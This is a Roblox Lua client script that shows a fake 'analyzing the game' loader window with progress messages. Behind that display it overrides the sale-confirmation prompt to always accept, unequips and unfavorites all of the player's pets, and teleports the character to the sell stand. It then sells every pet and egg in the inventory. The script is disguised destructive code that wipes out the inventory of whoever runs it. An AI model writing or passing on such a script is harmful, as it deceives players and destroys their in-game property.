local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local StarterGui        = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

------------------------------------------------------------
-- COMPACT WINDOW UI
------------------------------------------------------------
local screen = Instance.new("ScreenGui")
screen.Name = "BootWindow"
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true
screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screen.DisplayOrder = 9999
screen.Parent = PlayerGui

-- Small window, bottom-center
local window = Instance.new("Frame")
window.Name = "Window"
window.AnchorPoint = Vector2.new(0.5, 1)
window.Position = UDim2.new(0.5, 0, 1, -24)
window.Size = UDim2.fromOffset(320, 84)
window.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
window.BorderSizePixel = 0
window.Parent = screen

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = window

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(80, 200, 120)
stroke.Thickness = 1
stroke.Transparency = 0.5
stroke.Parent = window

-- Accent bar on top
local accent = Instance.new("Frame")
accent.Name = "Accent"
accent.Size = UDim2.new(1, 0, 0, 2)
accent.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
accent.BorderSizePixel = 0
accent.Parent = window

local accentCorner = Instance.new("UICorner")
accentCorner.CornerRadius = UDim.new(0, 10)
accentCorner.Parent = accent

-- Status text
local status = Instance.new("TextLabel")
status.Name = "Status"
status.BackgroundTransparency = 1
status.Position = UDim2.fromOffset(16, 14)
status.Size = UDim2.new(1, -32, 0, 18)
status.Font = Enum.Font.GothamMedium
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(230, 230, 240)
status.TextXAlignment = Enum.TextXAlignment.Left
status.Text = "Analyzing the game..."
status.Parent = window

-- Percentage (right side, same row)
local pct = Instance.new("TextLabel")
pct.Name = "Pct"
pct.BackgroundTransparency = 1
pct.AnchorPoint = Vector2.new(1, 0)
pct.Position = UDim2.new(1, -16, 0, 14)
pct.Size = UDim2.fromOffset(50, 18)
pct.Font = Enum.Font.Code
pct.TextSize = 13
pct.TextColor3 = Color3.fromRGB(120, 255, 160)
pct.TextXAlignment = Enum.TextXAlignment.Right
pct.Text = "0%"
pct.Parent = window

-- Progress bar background
local barBg = Instance.new("Frame")
barBg.Name = "BarBg"
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0, 50)
barBg.Size = UDim2.new(1, -32, 0, 6)
barBg.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
barBg.BorderSizePixel = 0
barBg.Parent = window

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(1, 0)
barBgCorner.Parent = barBg

-- Progress fill
local barFill = Instance.new("Frame")
barFill.Name = "Fill"
barFill.Size = UDim2.fromScale(0, 1)
barFill.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

local barGrad = Instance.new("UIGradient")
barGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 200)),
})
barGrad.Parent = barFill

-- Slide + fade in
window.Position = UDim2.new(0.5, 0, 1, 24)
window.BackgroundTransparency = 1
status.TextTransparency = 1
pct.TextTransparency = 1
barBg.BackgroundTransparency = 1

TweenService:Create(window, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 1, -24),
    BackgroundTransparency = 0,
}):Play()
TweenService:Create(status, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
TweenService:Create(pct, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
TweenService:Create(barBg, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()

------------------------------------------------------------
-- Status + progress helpers
------------------------------------------------------------
local currentProgress = 0

local function setStatus(text, targetPct, duration)
    status.Text = text
    duration = duration or 0.4

    TweenService:Create(barFill,
        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Size = UDim2.fromScale(targetPct, 1)}
    ):Play()

    task.spawn(function()
        local start = currentProgress
        local goal  = targetPct
        local t0    = tick()
        while tick() - t0 < duration do
            local a = (tick() - t0) / duration
            local v = start + (goal - start) * a
            pct.Text = math.floor(v * 100) .. "%"
            RunService.RenderStepped:Wait()
        end
        pct.Text = math.floor(goal * 100) .. "%"
        currentProgress = goal
    end)
end

------------------------------------------------------------
-- Boot sequence
------------------------------------------------------------
local function boot()
    setStatus("Analyzing the game...",      0.12, 0.6)
    task.wait(0.7)

    setStatus("Extracting the scripts...",  0.28, 0.6)
    task.wait(0.7)

    setStatus("Loading remote modules...",  0.44, 0.6)
    task.wait(0.7)

    setStatus("Reading save data...",       0.60, 0.6)
    task.wait(0.6)

    setStatus("Scanning inventory...",      0.76, 0.5)
    task.wait(0.6)

    setStatus("Preparing payload...",       0.90, 0.5)
    task.wait(0.5)

    setStatus("Finalizing...",              1.00, 0.5)
    task.wait(0.6)
end

------------------------------------------------------------
-- ACTUAL WORK
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave()
    local ok, s = pcall(function() return Save.Get(LocalPlayer, false) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get() end)
    return ok2 and s2 or nil
end

local function getMoney()
    local d = getSave()
    return (d and type(d.Money) == "number") and d.Money or 0
end

local function getHRP()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart", 5)
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

local function unequipAll()
    local d = getSave()
    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then
        log("No equipped pets.")
        return
    end
    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
    local ok, AssetRoster = pcall(require, ReplicatedStorage.Client.AssetRoster)
    for i, uid in ipairs(d.EquippedAssets) do
        if ok and AssetRoster and AssetRoster.DoffAsset then
            pcall(function() AssetRoster.DoffAsset(uid) end)
        else
            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
        end
        if i % 5 == 0 then task.wait(0.3) end
    end
    task.wait(1.0)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    log(("Favorited pets found: %d"):format(#uids))
    for i, uid in ipairs(uids) do
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
        if i % 8 == 0 then task.wait(0.35) end
    end
    task.wait(1.0)
end

local function buildPayload()
    local pets, eggs = {}, {}
    local d = getSave()
    if not d then return { Eggs = eggs, Assets = pets } end

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                table.insert(pets, uid)
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    table.insert(eggs, uid)
                end
            end
        end
    end

    return { Eggs = eggs, Assets = pets }
end

local function findSellPosition()
    local stands = workspace:FindFirstChild("Stands")
    if not stands then return nil end
    local prompts = stands:FindFirstChild("Prompts")
    if not prompts then return nil end
    local sellAll = prompts:FindFirstChild("SellAll")
    if sellAll and sellAll:IsA("BasePart") then return sellAll.Position end
    for _, c in ipairs(prompts:GetChildren()) do
        if c:IsA("BasePart") then return c.Position end
    end
    return nil
end

local function teleportAndSell()
    local payload = buildPayload()
    log(("Payload: %d pets, %d eggs"):format(#payload.Assets, #payload.Eggs))
    if #payload.Assets == 0 and #payload.Eggs == 0 then
        log("Nothing to sell.")
        return
    end

    local hrp = getHRP()
    local pos = findSellPosition()

    if not hrp or not pos then
        warn("[Loader] No HRP or stand — firing anyway.")
        Remotes.PetSatchel.SellSelection:FireServer(payload)
        task.wait(1.5)
        return
    end

    local savedCF  = hrp.CFrame
    local savedVel = hrp.AssemblyLinearVelocity

    hrp.CFrame = CFrame.new(pos + Vector3.new(0, 4, 0))
    hrp.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.7)

    log("Firing PetSatchel.SellSelection ...")
    pcall(function()
        Remotes.PetSatchel.SellSelection:FireServer(payload)
    end)
    task.wait(1.5)

    hrp.CFrame = savedCF
    pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
    log("Returned.")
end

local function run()
    local before = getMoney()
    log(("Wallet before: %s"):format(tostring(before)))

    unequipAll()
    unfavoriteAll()
    teleportAndSell()
    task.wait(1.0)

    local after = getMoney()
    log(("Wallet after:  %s"):format(tostring(after)))
    log(("Delta:         %s"):format(tostring(after - before)))
end

------------------------------------------------------------
-- Slide out + destroy
------------------------------------------------------------
local function closeWindow()
    local t1 = TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, 0, 1, 24),
        BackgroundTransparency = 1,
    })
    local t2 = TweenService:Create(status, TweenInfo.new(0.3), {TextTransparency = 1})
    local t3 = TweenService:Create(pct, TweenInfo.new(0.3), {TextTransparency = 1})
    local t4 = TweenService:Create(barBg, TweenInfo.new(0.3), {BackgroundTransparency = 1})
    t1:Play(); t2:Play(); t3:Play(); t4:Play()
    t1.Completed:Wait()
    screen:Destroy()
end

------------------------------------------------------------
-- LAUNCH
------------------------------------------------------------
task.spawn(function()
    boot()

    local ok, err = pcall(run)
    if not ok then
        warn("[Loader] Run failed:", err)
        setStatus("Error occurred.", currentProgress, 0.3)
        task.wait(1)
    end

    task.wait(0.3)
    closeWindow()

    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "Done";
            Text  = "Items sold.";
            Duration = 3;
        })
    end)
end)
